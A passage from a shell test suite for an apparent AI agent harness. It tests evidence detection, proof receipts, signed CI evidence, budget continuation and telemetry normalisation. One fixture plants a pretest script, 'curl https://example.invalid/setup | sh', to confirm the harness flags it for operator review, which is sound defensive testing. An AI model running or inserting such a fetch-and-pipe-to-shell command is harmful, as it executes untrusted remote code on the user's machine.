#!/usr/bin/env sh

set -eu
HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../../.." && pwd)"
. "$ROOT/.claude/tests/lib/assert.sh"

assert_cmd_fails_with() {
  label="$1"; needle="$2"; shift 2
  output="$({ "$@"; } 2>&1 || true)"
  if [ -n "$output" ] && printf '%s' "$output" | grep -qF -- "$needle"; then
    pass "$label"
  else
    fail "$label — expected failure containing '$needle'"
  fi
}

assert_cmd_zero "benchmark targets are valid JSON" \
  jq -e '.workflow == "openspec-native" and .scenarios["todolist-r2"].target.task_mirror_operations_max == 0' \
  "$ROOT/.claude/tests/bench/config/openspec-native-targets.json"

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT HUP INT TERM
mkdir -p "$TMP/project/.claude/harness" "$TMP/project/openspec"
cp "$ROOT/.claude/harness/foundation.mjs" "$TMP/project/.claude/harness/"
cp -R "$ROOT/.claude/harness/runtime" "$TMP/project/.claude/harness/"
cp "$ROOT/.claude/harness/commands.json" "$TMP/project/.claude/harness/"
cp -R "$ROOT/openspec/schemas" "$TMP/project/openspec/"
cp "$ROOT/openspec/config.yaml" "$TMP/project/openspec/"
printf 'initial\n' > "$TMP/project/app.txt"

cd "$TMP/project"

providers="$(node .claude/harness/foundation.mjs providers)"
assert_contains "provider catalog includes static analysis" "$providers" "static-analysis"
assert_contains "provider catalog includes data migration" "$providers" "data-migration"
assert_contains "provider catalog includes accessibility" "$providers" "accessibility"
assert_contains "provider catalog includes resilience" "$providers" "resilience"
assert_contains "provider catalog includes observability" "$providers" "observability"
assert_contains "provider catalog includes deployment" "$providers" "deployment"
assert_contains "provider catalog includes supply chain" "$providers" "dependency-supply-chain"
assert_contains "provider catalog exposes executable test wiring" "$providers" \
  'CONFIG test-discovery'
assert_contains "test wiring names the structured report field" "$providers" \
  'workspace-relative-structured-json-report'

# Evidence bootstrap detects repository-owned commands without executing them,
# previews changes by default, and writes only explicit high-confidence wiring.
node .claude/harness/foundation.mjs new 'Bootstrap evidence providers' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve bootstrap-evidence-providers \
  --impact low --coupling isolated >/dev/null
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "claims": [' \
  '    {"id":"bootstrap-test","scenario":"Tests cover bootstrap behavior","impact":"low","capabilities":["test"]},' \
  '    {"id":"bootstrap-static","scenario":"Bootstrap remains statically valid","impact":"low","capabilities":["static-analysis"]}' \
  '  ]' \
  '}' > openspec/changes/bootstrap-evidence-providers/evidence.yaml
printf '%s\n' \
  '{' \
  '  "scripts": {' \
  '    "test": "printf should-not-run > detection-marker && vitest",' \
  '    "typecheck": "printf should-not-run > static-marker"' \
  '  },' \
  '  "devDependencies": {"vitest":"1.0.0"}' \
  '}' > package.json
bootstrap_detect="$(node .claude/harness/foundation.mjs evidence-detect \
  bootstrap-evidence-providers)"
assert_contains "evidence detection finds structured test wiring" \
  "$bootstrap_detect" '"adapter": "test-discovery"'
assert_contains "evidence detection finds static analysis wiring" \
  "$bootstrap_detect" '"provider": "static-analysis"'
if [ -e detection-marker ]; then
  fail "evidence detection never executes a package script"
else
  pass "evidence detection never executes a package script"
fi
bootstrap_preview="$(node .claude/harness/foundation.mjs evidence-init \
  bootstrap-evidence-providers)"
assert_contains "evidence init previews without writing" "$bootstrap_preview" '"write": false'
assert_eq "preview preserves empty execution wiring" "0" \
  "$(jq '.providers | length' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
node .claude/harness/foundation.mjs evidence-init bootstrap-evidence-providers \
  --write >/dev/null
assert_eq "explicit evidence init writes test-discovery" "test-discovery" \
  "$(jq -r '.providers.test.adapter' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
assert_eq "explicit evidence init writes static command" "command" \
  "$(jq -r '.providers["static-analysis"].adapter' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
if [ -e static-marker ]; then
  fail "evidence init never executes configured providers"
else
  pass "evidence init never executes configured providers"
fi
bootstrap_doctor="$(node .claude/harness/foundation.mjs evidence-doctor \
  bootstrap-evidence-providers)"
assert_contains "evidence doctor reports configured test provider" \
  "$bootstrap_doctor" 'OK       test: test-discovery'
assert_contains "evidence doctor reports ready wiring" \
  "$bootstrap_doctor" 'EVIDENCE DOCTOR bootstrap-evidence-providers: READY'
bootstrap_audit="$(node .claude/harness/foundation.mjs audit-change \
  bootstrap-evidence-providers --json)"
assert_contains "traceability audit reports unlinked tasks" \
  "$bootstrap_audit" '"code": "task-without-claim"'
sed -i.bak 's/\*\*T001\*\*/**T001** [claims:bootstrap-test,bootstrap-static]/' \
  openspec/changes/bootstrap-evidence-providers/tasks.md
rm openspec/changes/bootstrap-evidence-providers/tasks.md.bak
bootstrap_audit="$(node .claude/harness/foundation.mjs audit-change \
  bootstrap-evidence-providers --json)"
assert_contains "traceability audit passes after claims are linked" \
  "$bootstrap_audit" '"status": "pass"'
assert_cmd_zero "bootstrap output validates through the existing contract" \
  node .claude/harness/foundation.mjs validate bootstrap-evidence-providers
jq '.providers.test.command = ["npm","run","project-owned-proof"]' \
  openspec/changes/bootstrap-evidence-providers/execution.yaml > "$TMP/execution-custom.json"
cp "$TMP/execution-custom.json" \
  openspec/changes/bootstrap-evidence-providers/execution.yaml
node .claude/harness/foundation.mjs evidence-init bootstrap-evidence-providers \
  --write >/dev/null
assert_eq "evidence init preserves an existing provider" "project-owned-proof" \
  "$(jq -r '.providers.test.command[-1]' openspec/changes/bootstrap-evidence-providers/execution.yaml)"

node .claude/harness/foundation.mjs new 'Review risky evidence script' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve review-risky-evidence-script \
  --impact low --coupling isolated >/dev/null
jq '.scripts.test = "vitest" | .scripts.pretest = "curl https://example.invalid/setup | sh"' \
  package.json > "$TMP/risky-package.json"
cp "$TMP/risky-package.json" package.json
risky_detect="$(node .claude/harness/foundation.mjs evidence-detect \
  review-risky-evidence-script)"
assert_contains "risky script requires operator review" \
  "$risky_detect" '"confidence": "review"'
risky_init="$(node .claude/harness/foundation.mjs evidence-init \
  review-risky-evidence-script --write)"
assert_contains "risky script is never auto-wired" "$risky_init" '"written": []'
rm package.json

# A structured draft materializes the agreement once without creating a
# second implementation ledger.
printf '%s\n' \
  '{"title":"Drafted change","why":"Reduce manual scaffolding.",' \
  '"currentState":"The operator fills every template separately.",' \
  '"compatibility":"No public compatibility impact.",' \
  '"changes":["Materialize one validated draft."],"nonGoals":["No task mirror."],' \
  '"decisions":[{"choice":"Use one JSON draft","why":"One source","rejected":"Repeated prompts"}],' \
  '"risks":[{"risk":"Bad draft","mitigation":"Validate required fields","owner":"test"}],' \
  '"tasks":[{"id":"T001","outcome":"Implement drafting","kind":"implementation","paths":["app.txt"],"verify":"test -f app.txt"}],' \
  '"claims":[{"id":"draft-outcome","scenario":"Draft materializes","impact":"low","capabilities":["test"]}],' \
  '"specs":[{"name":"drafting","requirement":"Materialize a draft","description":"The runtime SHALL materialize one draft.",' \
  '"scenario":"Valid draft","when":"a valid draft is supplied","then":"all agreement artifacts are populated"}]}' \
  > foundation-draft.json
assert_cmd_zero "structured draft scaffolds a complete agreement" \
  node .claude/harness/foundation.mjs new "Drafted change" --draft foundation-draft.json
node .claude/harness/foundation.mjs resolve drafted-change \
  --impact low --coupling isolated --acceptance-not-required >/dev/null
assert_cmd_zero "drafted agreement validates without a second ledger" \
  node .claude/harness/foundation.mjs validate drafted-change
assert_file_contains "draft task remains in tasks.md" \
  openspec/changes/drafted-change/tasks.md "**T001**"

# A human-readable empty security value must not become a real trigger and
# silently upgrade an otherwise rapid change to the standard schema.
node .claude/harness/foundation.mjs new 'No security trigger' --rapid >/dev/null
security_output="$(node .claude/harness/foundation.mjs resolve no-security-trigger \
  --impact low --coupling isolated --security none)"
assert_contains "security none remains empty" "$security_output" "security: none"
assert_contains "security none does not require review" "$security_output" "review: not required"
assert_cmd_zero "security none preserves rapid schema" \
  jq -e '.schema == "foundation-rapid" and .securityTriggers == []' \
  .foundation/runtime/no-security-trigger.json
if node .claude/harness/foundation.mjs packet no-security-trigger \
  --phase build >/dev/null 2>&1; then
  fail "Build packet requires isolation"
else
  pass "Build packet requires isolation"
fi
node .claude/harness/foundation.mjs sandbox create no-security-trigger >/dev/null
assert_cmd_zero "Build packet opens after sandbox creation" \
  node .claude/harness/foundation.mjs packet no-security-trigger --phase build

jq '.budget = {targetRequests:80,targetTokens:800000,usedRequests:81,usedTokens:900000,measurement:"legacy"}' \
  .foundation/runtime/no-security-trigger.json > "$TMP/legacy-budget.json"
cp "$TMP/legacy-budget.json" .foundation/runtime/no-security-trigger.json
cp .foundation/runtime/no-security-trigger.json "$TMP/legacy-budget-before-metrics.json"
legacy_budget="$(node .claude/harness/foundation.mjs metrics no-security-trigger)"
assert_contains "legacy change-wide budget migrates without carrying a lock" \
  "$legacy_budget" '"reason": "runtime-upgrade"'
assert_contains "legacy lifetime usage is visible without mutating metrics" \
  "$legacy_budget" '"usedTokens": 900000'
assert_contains "legacy metrics exposes an empty migrated window" \
  "$legacy_budget" '"usedRequests": 0'
assert_cmd_zero "metrics remains read-only during legacy normalization" \
  cmp "$TMP/legacy-budget-before-metrics.json" .foundation/runtime/no-security-trigger.json

node .claude/harness/foundation.mjs new 'Missing artifact budget recovery' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve missing-artifact-budget-recovery \
  --impact low --coupling isolated >/dev/null
rm openspec/changes/missing-artifact-budget-recovery/tasks.md
jq '.budget.window.mode = "operator-required" | del(.budget.window.extensionNumber)' \
  .foundation/runtime/missing-artifact-budget-recovery.json > "$TMP/operator-required-budget.json"
cp "$TMP/operator-required-budget.json" \
  .foundation/runtime/missing-artifact-budget-recovery.json
legacy_window_id="$(jq -r '.budget.window.id' \
  .foundation/runtime/missing-artifact-budget-recovery.json)"
assert_cmd_fails_with "budget continuation stops for a user decision" \
  "requires --decision-ref" \
  node .claude/harness/foundation.mjs budget-continue \
  missing-artifact-budget-recovery --reason "complete required artifacts"
legacy_continue="$(node .claude/harness/foundation.mjs budget-continue \
  missing-artifact-budget-recovery --reason "complete required artifacts" \
  --decision-ref fixture://user/continue-missing-artifact)"
assert_contains "legacy operator-required state has a continuation route" \
  "$legacy_continue" "BUDGET CONTINUED"
assert_eq "continuation without --run retains the active run identity" \
  "$legacy_window_id" "$(jq -r '.budget.window.id' \
    .foundation/runtime/missing-artifact-budget-recovery.json)"
assert_file_contains "missing tasks produces an audited configuration blocker" \
  .foundation/logs/missing-artifact-budget-recovery/budget-events.jsonl \
  '"requiredStatus":"CONFIGURATION_ERROR"'

node .claude/harness/foundation.mjs new 'Mixed telemetry runs' --rapid >/dev/null
printf '%s\n' \
  '{"requestId":"mixed-a","runId":"run-a","inputTokens":10}' \
  '{"requestId":"mixed-b","runId":"run-b","inputTokens":20}' \
  > "$TMP/mixed-runs.jsonl"
node .claude/harness/foundation.mjs telemetry-import mixed-telemetry-runs \
  "$TMP/mixed-runs.jsonl" >/dev/null
assert_eq "batched telemetry scopes the window to the active run" "20" \
  "$(jq -r '.budget.window.usedTokens' .foundation/runtime/mixed-telemetry-runs.json)"
assert_eq "batched telemetry preserves lifetime usage across runs" "30" \
  "$(jq -r '.budget.lifetime.usedTokens' .foundation/runtime/mixed-telemetry-runs.json)"

printf '%s\n' \
  '{"id":"cursor-request","runId":"cursor-run","model":"cursor-model","usage":{"inputTokens":7,"outputTokens":5}}' \
  > "$TMP/cursor-events.jsonl"
node .claude/harness/foundation.mjs telemetry-import mixed-telemetry-runs \
  "$TMP/cursor-events.jsonl" --format cursor >/dev/null
assert_cmd_zero "Cursor telemetry normalizes portable token fields" \
  jq -e 'select(.requestId == "cursor-request") | .source == "cursor" and .modelId == "cursor-model" and .inputTokens == 7 and .outputTokens == 5' \
  .foundation/logs/mixed-telemetry-runs/events.jsonl

printf '%s\n' \
  '{"traceId":"otel-trace","attributes":{"gen_ai.request.model":"otel-model","gen_ai.usage.input_tokens":11,"gen_ai.usage.output_tokens":13}}' \
  > "$TMP/otel-events.jsonl"
node .claude/harness/foundation.mjs telemetry-import mixed-telemetry-runs \
  "$TMP/otel-events.jsonl" --format otel >/dev/null
assert_cmd_zero "OpenTelemetry GenAI attributes normalize into usage events" \
  jq -e 'select(.requestId == "otel-trace") | .source == "otel" and .modelId == "otel-model" and .inputTokens == 11 and .outputTokens == 13' \
  .foundation/logs/mixed-telemetry-runs/events.jsonl

# A CI system can return a signed, workspace-bound evidence envelope. The
# harness verifies trust, identity, run provenance, and artifact digests before
# creating the ordinary durable receipt used by proof.
node .claude/harness/foundation.mjs new 'Verify signed CI evidence' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve verify-signed-ci-evidence \
  --impact low --coupling isolated >/dev/null
jq '.claims[0].capabilities = ["deployment"]' \
  openspec/changes/verify-signed-ci-evidence/evidence.yaml > "$TMP/ci-evidence.json"
cp "$TMP/ci-evidence.json" openspec/changes/verify-signed-ci-evidence/evidence.yaml
node "$ROOT/.claude/tests/harness/sign-envelope.mjs" generate \
  "$TMP/ci-private.pem" "$TMP/ci-public.pem"
jq --rawfile key "$TMP/ci-public.pem" \
  '.providers.deployment = {"adapter":"external","ci":{"issuer":"fixture-ci","publicKey":$key}}' \
  openspec/changes/verify-signed-ci-evidence/execution.yaml > "$TMP/ci-execution.json"
cp "$TMP/ci-execution.json" openspec/changes/verify-signed-ci-evidence/execution.yaml
sed 's/- \[ \]/- [x]/g' openspec/changes/verify-signed-ci-evidence/tasks.md \
  > "$TMP/ci-tasks.md"
cp "$TMP/ci-tasks.md" openspec/changes/verify-signed-ci-evidence/tasks.md
ci_workspace_hash="$(node .claude/harness/foundation.mjs hash verify-signed-ci-evidence)"
jq -n --arg workspace "$ci_workspace_hash" \
  '{version:1,issuer:"fixture-ci",changeId:"verify-signed-ci-evidence",provider:"deployment",workspaceHash:$workspace,status:"pass",runUrl:"https://ci.example.invalid/runs/42",observed:"Deployment package and rollback checks passed",artifacts:[{name:"deployment-report.json",sha256:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}' \
  > "$TMP/ci-payload.json"
node "$ROOT/.claude/tests/harness/sign-envelope.mjs" sign \
  "$TMP/ci-payload.json" "$TMP/ci-private.pem" "$TMP/ci-envelope.json"
assert_cmd_zero "signed CI evidence records a verified receipt" \
  node .claude/harness/foundation.mjs evidence-verify-ci \
    verify-signed-ci-evidence deployment "$TMP/ci-envelope.json"
assert_eq "signed CI receipt records trusted provenance" "signed-ci:fixture-ci" \
  "$(jq -r '.provenance.source' .foundation/receipts/verify-signed-ci-evidence/deployment.json)"
assert_contains "signed CI evidence satisfies proof planning" \
  "$(node .claude/harness/foundation.mjs proof-plan verify-signed-ci-evidence)" \
  "deployment: valid"
jq '.payload.status = "fail"' "$TMP/ci-envelope.json" > "$TMP/tampered-ci-envelope.json"
assert_cmd_fails_with "tampered CI payload is rejected" "signature is invalid" \
  node .claude/harness/foundation.mjs evidence-verify-ci \
    verify-signed-ci-evidence deployment "$TMP/tampered-ci-envelope.json"

# Existing evidence v1 remains readable and has an explicit, non-destructive
# upgrade into the executable-ready v2 envelope.
node .claude/harness/foundation.mjs new 'Legacy evidence' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve legacy-evidence \
  --impact low --coupling isolated >/dev/null
jq 'del(.providers) | .version = 1' \
  openspec/changes/legacy-evidence/evidence.yaml > "$TMP/legacy-evidence.json"
cp "$TMP/legacy-evidence.json" openspec/changes/legacy-evidence/evidence.yaml
assert_cmd_zero "evidence v1 remains valid" \
  node .claude/harness/foundation.mjs validate legacy-evidence
assert_cmd_zero "evidence v1 upgrades explicitly" \
  node .claude/harness/foundation.mjs evidence-upgrade legacy-evidence
assert_eq "evidence upgrade writes v2" "2" \
  "$(jq -r '.version' openspec/changes/legacy-evidence/evidence.yaml)"

output="$(node .claude/harness/foundation.mjs new 'Profile owner update')"
assert_contains "creates standard change" "$output" "CREATED profile-owner-update"
assert_file_exists "runtime state created" ".foundation/runtime/profile-owner-update.json"
assert_file_exists "delta spec created" "openspec/changes/profile-owner-update/specs/change/spec.md"
node .claude/harness/foundation.mjs resolve profile-owner-update \
  --impact medium --coupling isolated >/dev/null
assert_cmd_fails_with "standard change stops for an explicit acceptance decision" \
  "acceptance decision is unresolved" \
  node .claude/harness/foundation.mjs validate profile-owner-update

output="$(node .claude/harness/foundation.mjs resolve profile-owner-update \
  --impact medium --coupling isolated --acceptance-not-required)"
assert_contains "resolver records impact" "$output" "impact: medium"
assert_cmd_zero "standard change validates" node .claude/harness/foundation.mjs validate profile-owner-update
pending_readiness="$(node .claude/harness/foundation.mjs proof-readiness \
  profile-owner-update 2>/dev/null || true)"
assert_contains "pending code returns a typed code-change status" \
  "$pending_readiness" '"status": "NEEDS_CODE_CHANGE"'
assert_contains "pending code offers a Build resume action" \
  "$pending_readiness" '"kind": "resume-build"'
assert_contains "Build recovery names the agent command" \
  "$pending_readiness" '"agentCommand": "/build profile-owner-update"'
packet="$(node .claude/harness/foundation.mjs packet profile-owner-update)"
assert_contains "compact packet carries required providers" "$packet" '"provider":"test"'
assert_contains "compact packet carries task count" "$packet" '"pendingTaskCount":'

if node .claude/harness/foundation.mjs run-provider profile-owner-update unknown-provider -- \
  sh -c 'printf unsafe > should-not-exist.txt' >/dev/null 2>&1; then
  fail "unknown provider is rejected before command execution"
else
  pass "unknown provider is rejected before command execution"
fi
assert_file_absent "unknown provider command has no side effect" "should-not-exist.txt"

if node .claude/harness/foundation.mjs run-provider profile-owner-update test -- \
  sh -c 'printf unsafe > missing-claims.txt' >/dev/null 2>&1; then
  fail "run-provider requires an explicit claim scope"
else
  pass "run-provider requires an explicit claim scope"
fi
assert_file_absent "missing claim scope prevents command execution" "missing-claims.txt"

sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/profile-owner-update/tasks.md
rm openspec/changes/profile-owner-update/tasks.md.bak
if node .claude/harness/foundation.mjs receipt profile-owner-update test pass \
  >/dev/null 2>&1; then
  fail "empty external receipt cannot pass"
else
  pass "empty external receipt cannot pass"
fi
assert_cmd_zero "test provider receipt" node .claude/harness/foundation.mjs receipt profile-owner-update test pass \
  --observed "fixture test evidence" --source harness-test --artifact app.txt
assert_cmd_zero "discovery provider receipt" node .claude/harness/foundation.mjs receipt profile-owner-update discovery pass \
  --discovered 3 --minimum 1 --observed "3 tests discovered" --source harness-test --artifact app.txt
assert_cmd_zero "complete evidence proves" node .claude/harness/foundation.mjs prove profile-owner-update
assert_cmd_zero "fresh proof is land-ready" node .claude/harness/foundation.mjs land-check profile-owner-update

jq '.budget.window.targetTokens = 1 | .budget.window.usedTokens = 1 | .budget.window.mode = "completion-only"' \
  .foundation/runtime/profile-owner-update.json > "$TMP/proven-budget.json"
cp "$TMP/proven-budget.json" .foundation/runtime/profile-owner-update.json
if node .claude/harness/foundation.mjs budget-continue profile-owner-update \
  --reason "run required proof" --decision-ref fixture://user/continue-proof >/dev/null 2>&1; then
  fail "budget cannot extend work that is already deterministic and ready"
else
  pass "budget cannot extend work that is already deterministic and ready"
fi

cp .foundation/receipts/profile-owner-update/test.json "$TMP/test-receipt.json"
jq '.providerFingerprint = "tampered"' .foundation/receipts/profile-owner-update/test.json \
  > "$TMP/tampered.json"
cp "$TMP/tampered.json" .foundation/receipts/profile-owner-update/test.json
if node .claude/harness/foundation.mjs land-check profile-owner-update >/dev/null 2>&1; then
  fail "tampered provider fingerprint invalidates receipt"
else
  pass "tampered provider fingerprint invalidates receipt"
fi
cp "$TMP/test-receipt.json" .foundation/receipts/profile-owner-update/test.json

printf '\nContract revision after proof.\n' >> openspec/changes/profile-owner-update/proposal.md
if node .claude/harness/foundation.mjs land-check profile-owner-update >/dev/null 2>&1; then
  fail "change packet edit invalidates proof"
else
  pass "change packet edit invalidates proof"
fi
node .claude/harness/foundation.mjs receipt profile-owner-update test pass \
  --observed "fixture test evidence" --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs receipt profile-owner-update discovery pass \
  --discovered 3 --minimum 1 --observed "3 tests discovered" \
  --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs prove profile-owner-update >/dev/null

printf 'changed\n' > app.txt
if node .claude/harness/foundation.mjs land-check profile-owner-update >/dev/null 2>&1; then
  fail "relevant edit invalidates proof"
else
  pass "relevant edit invalidates proof"
fi

node .claude/harness/foundation.mjs new 'Production provider coverage' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve production-provider-coverage \
  --impact low --coupling isolated >/dev/null
sed -i.bak \
  's/"capabilities": \["test"\]/"capabilities": ["static-analysis", "data-migration", "accessibility", "resilience", "observability", "deployment", "dependency-supply-chain"]/' \
  openspec/changes/production-provider-coverage/evidence.yaml
rm openspec/changes/production-provider-coverage/evidence.yaml.bak
assert_cmd_zero "production provider capabilities validate" \
  node .claude/harness/foundation.mjs validate production-provider-coverage
plan="$(node .claude/harness/foundation.mjs proof-plan production-provider-coverage)"
assert_contains "proof plan selects deployment evidence" "$plan" "deployment: missing"
assert_contains "proof plan selects migration evidence" "$plan" "data-migration: missing"
sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/production-provider-coverage/tasks.md
rm openspec/changes/production-provider-coverage/tasks.md.bak
for provider in static-analysis data-migration accessibility resilience observability deployment dependency-supply-chain; do
  node .claude/harness/foundation.mjs receipt production-provider-coverage "$provider" pass \
    --observed "fixture evidence for $provider" --source harness-test --artifact app.txt >/dev/null
done
assert_cmd_zero "new provider receipts produce a complete proof" \
  node .claude/harness/foundation.mjs prove production-provider-coverage

# Evidence v2 executes a DAG, emits test+discovery from one process, and
# deduplicates an identical command used by another read-only provider.
node .claude/harness/foundation.mjs new 'Executable evidence' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve executable-evidence \
  --impact low --coupling isolated >/dev/null
printf '%s\n' '#!/usr/bin/env sh' \
  'count=0' \
  '[ ! -f .foundation/provider-count.txt ] || count="$(cat .foundation/provider-count.txt)"' \
  'count=$((count + 1))' \
  'printf "%s\\n" "$count" > .foundation/provider-count.txt' \
  'printf "%s\\n" "{\"numTotalTests\":4}"' > provider-fixture.sh
chmod +x provider-fixture.sh
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "providers": {' \
  '    "test": {"adapter":"test-discovery","command":["sh","provider-fixture.sh"],"minimum":4,"inputs":["provider-fixture.sh"]},' \
  '    "static-analysis": {"adapter":"command","command":["sh","provider-fixture.sh"],"inputs":["provider-fixture.sh"]}' \
  '  },' \
  '  "claims": [' \
  '    {"id":"executable-outcome","scenario":"Configured evidence passes","impact":"low","capabilities":["test","static-analysis"]}' \
  '  ]' \
  '}' > openspec/changes/executable-evidence/evidence.yaml
sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/executable-evidence/tasks.md
rm openspec/changes/executable-evidence/tasks.md.bak
assert_cmd_zero "proof execute runs configured evidence DAG" \
  node .claude/harness/foundation.mjs proof-execute executable-evidence
assert_eq "identical provider command executes once" "1" "$(tr -d '\n' < .foundation/provider-count.txt)"
assert_file_exists "combined adapter emits test receipt" \
  .foundation/receipts/executable-evidence/test.json
assert_file_exists "combined adapter emits discovery receipt" \
  .foundation/receipts/executable-evidence/discovery.json
assert_file_exists "DAG emits static receipt" \
  .foundation/receipts/executable-evidence/static-analysis.json
readiness="$(node .claude/harness/foundation.mjs proof-readiness executable-evidence)"
assert_contains "proof readiness returns a typed ready state" "$readiness" '"status": "READY"'

# Project-owned evidence must be collectible before an external review receipt
# exists. Final proof remains blocked until review, then reuses the collected
# receipt instead of executing the provider again.
node .claude/harness/foundation.mjs new 'Collect before review' >/dev/null
node .claude/harness/foundation.mjs resolve collect-before-review \
  --impact medium --coupling coupled --acceptance-not-required >/dev/null
printf '%s\n' '#!/usr/bin/env sh' \
  'count=0' \
  '[ ! -f .foundation/collect-count.txt ] || count="$(cat .foundation/collect-count.txt)"' \
  'count=$((count + 1))' \
  'printf "%s\\n" "$count" > .foundation/collect-count.txt' \
  'printf "%s\\n" "{\"numTotalTests\":2}"' > collect-fixture.sh
chmod +x collect-fixture.sh
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "providers": {' \
  '    "test": {"adapter":"test-discovery","command":["sh","collect-fixture.sh"],"minimum":2,"inputs":["collect-fixture.sh"]},' \
  '    "review": {"adapter":"external"}' \
  '  },' \
  '  "claims": [' \
  '    {"id":"collect-outcome","scenario":"Collected tests pass before review","impact":"low","capabilities":["test"]}' \
  '  ]' \
  '}' > openspec/changes/collect-before-review/evidence.yaml
sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/collect-before-review/tasks.md
rm openspec/changes/collect-before-review/tasks.md.bak
review_decision="$(node .claude/harness/foundation.mjs proof-readiness \
  collect-before-review 2>/dev/null || true)"
assert_contains "external review returns a user decision" \
  "$review_decision" '"kind": "independent-review"'
assert_contains "review decision routes through the authority bridge" \
  "$review_decision" "authority request collect-before-review --type review"
assert_not_contains "review recovery never manufactures a passing receipt" \
  "$review_decision" "evidence record collect-before-review review pass"
collect_output="$(node .claude/harness/foundation.mjs proof-collect collect-before-review)"
assert_contains "proof collect completes without finalizing" \
  "$collect_output" '"proofFinalized": false'
assert_contains "proof collect preserves the external review boundary" \
  "$collect_output" '"status": "NEEDS_USER_DECISION"'
assert_contains "proof collect reports its executed provider" \
  "$collect_output" '"test"'
assert_eq "proof collect executes the provider once" "1" \
  "$(tr -d '\n' < .foundation/collect-count.txt)"
assert_file_exists "proof collect records test evidence" \
  .foundation/receipts/collect-before-review/test.json
assert_file_absent "proof collect does not finalize proof" \
  .foundation/receipts/collect-before-review/proof.json
jq '.budget.window.mode = "completion-only" | .budget.window.targetTokens = 1 | .budget.window.usedTokens = 1' \
  .foundation/runtime/collect-before-review.json > "$TMP/external-budget.json"
cp "$TMP/external-budget.json" .foundation/runtime/collect-before-review.json
if external_budget_error="$(node .claude/harness/foundation.mjs budget-continue \
  collect-before-review --reason "wait for review" \
  --decision-ref fixture://user/wait-review 2>&1)"; then
  fail "external evidence cannot open a model budget window"
else
  assert_contains "external evidence rejects model budget with a typed reason" \
    "$external_budget_error" "external-authority"
fi
collect_review_packet="$(node .claude/harness/foundation.mjs packet \
  collect-before-review --phase review)"
assert_contains "review packet receives valid collected test evidence" \
  "$collect_review_packet" '"provider":"test","capability":"test","validity":"valid"'
node .claude/harness/foundation.mjs receipt collect-before-review \
  review pass --observed "fixture review found no blockers" \
  --reviewer harness-test --subject-actor implementation-agent \
  --reference "fixture://collect-review" >/dev/null
assert_cmd_zero "final proof reuses evidence collected before review" \
  node .claude/harness/foundation.mjs proof-run collect-before-review
assert_eq "final proof does not rerun collected provider" "1" \
  "$(tr -d '\n' < .foundation/collect-count.txt)"

# An executable provider that is configured but unavailable must expose safe,
# structured recovery choices instead of leaving the operator at a dead end.
node .claude/harness/foundation.mjs new 'Unavailable provider recovery' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve unavailable-provider-recovery \
  --impact low --coupling isolated >/dev/null
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "providers": {' \
  '    "static-analysis": {"adapter":"command","command":["foundation-provider-that-does-not-exist"],"inputs":["app.txt"]}' \
  '  },' \
  '  "claims": [' \
  '    {"id":"static-outcome","scenario":"Static checks pass","impact":"low","capabilities":["static-analysis"]}' \
  '  ]' \
  '}' > openspec/changes/unavailable-provider-recovery/evidence.yaml
sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/unavailable-provider-recovery/tasks.md
rm openspec/changes/unavailable-provider-recovery/tasks.md.bak
unavailable_readiness="$(node .claude/harness/foundation.mjs proof-readiness \
  unavailable-provider-recovery 2>/dev/null || true)"
assert_contains "unavailable provider returns infrastructure status" \
  "$unavailable_readiness" '"status": "INFRASTRUCTURE_ERROR"'
assert_contains "unavailable provider identifies missing command" \
  "$unavailable_readiness" '"reason": "command"'
assert_contains "unavailable provider offers diagnosis" \
  "$unavailable_readiness" '"kind": "diagnose"'
assert_contains "unavailable provider offers retry" \
  "$unavailable_readiness" '"kind": "retry"'
assert_contains "unavailable provider offers external evidence" \
  "$unavailable_readiness" '"kind": "external-evidence"'
assert_contains "unavailable provider offers safe reconfiguration" \
  "$unavailable_readiness" '"kind": "reconfigure"'
assert_contains "external fallback requires a durable real result" \
  "$unavailable_readiness" 'Provide a real external result and durable reference.'
assert_not_contains "external fallback does not expose an artifact placeholder" \
  "$unavailable_readiness" '--artifact <path>'
assert_contains "reconfiguration preserves the declared claim contract" \
  "$unavailable_readiness" 'proves the same declared claims'
jq '.budget.window.mode = "completion-only" | .budget.window.targetTokens = 1 | .budget.window.usedTokens = 1' \
  .foundation/runtime/unavailable-provider-recovery.json > "$TMP/infrastructure-budget.json"
cp "$TMP/infrastructure-budget.json" \
  .foundation/runtime/unavailable-provider-recovery.json
if infrastructure_budget_error="$(node .claude/harness/foundation.mjs budget-continue \
  unavailable-provider-recovery --reason "retry provider" \
  --decision-ref fixture://user/retry-provider 2>&1)"; then
  fail "infrastructure failure cannot open a model budget window"
else
  assert_contains "infrastructure failure rejects model budget with a typed reason" \
    "$infrastructure_budget_error" "infrastructure"
fi
# Typed non-ready commands are lifecycle stops, not implementation rework.
FOUNDATION_TELEMETRY=1 node .claude/harness/foundation.mjs proof-readiness \
  unavailable-provider-recovery >/dev/null 2>&1 || true
unavailable_metrics="$(node .claude/harness/foundation.mjs metrics \
  unavailable-provider-recovery)"
assert_contains "typed readiness stop is counted separately" \
  "$unavailable_metrics" '"expectedStops": 1'
assert_contains "typed readiness stop is not failed rework" \
  "$unavailable_metrics" '"failedOperations": 0'
mkdir -p .foundation/leases/tasks/unavailable-provider-recovery
printf '%s\n' \
